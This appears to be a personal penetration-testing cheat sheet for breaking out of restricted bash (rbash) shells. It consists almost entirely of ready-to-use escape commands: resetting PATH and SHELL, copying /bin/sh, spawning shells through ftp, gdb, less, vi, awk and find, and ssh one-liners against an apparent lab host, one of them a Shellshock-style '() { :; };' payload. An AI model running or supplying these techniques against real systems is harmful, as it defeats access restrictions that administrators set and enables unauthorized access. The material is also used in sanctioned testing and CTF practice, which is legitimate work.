# How to break out of a restricted shell - rbash
https://speakerdeck.com/knaps/escape-from-shellcatraz-breaking-out-of-restricted-unix-shells
https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells

Steps to follow -

1. Run 'env'
2. echo $PATH
3. echo $SHELL
4. Try basic commands like ls, cd, pwd, cd .., env, set ,export, vi, cp ,mv


# Next try these -

1. if '/' are allowed then run /bin/sh
2. if you can set PATH and SHELL variables
    export PATH=/bin:/usr/bin:$PATH
OR  export SHELL=/bin/sh
3. If we can copy files then
    cp /bin/sh /some/dir/from/PATH; sh

# Try the installed utilities

1. ftp -> !/bin/sh
2. gdb -> !/bin/sh
3. more/less/man -> !/bin/sh
4. vi/vim -> :!/bin/sh
5. scp -S /tmp/getout.sh x y:
6. awk 'BEGIN {system("/bin/sh")}'
7. find / name random -exec /bin/sh \;

# External help

Use commands in ssh to help break out like -
1. ssh mindy@10.10.10.51 -t "bash --noprofile"
2. ssh user@IP_ADDRESS -t "() { :; }; /bin/bash"
3. ssh mindy@10.10.10.51 -t "/bin/sh"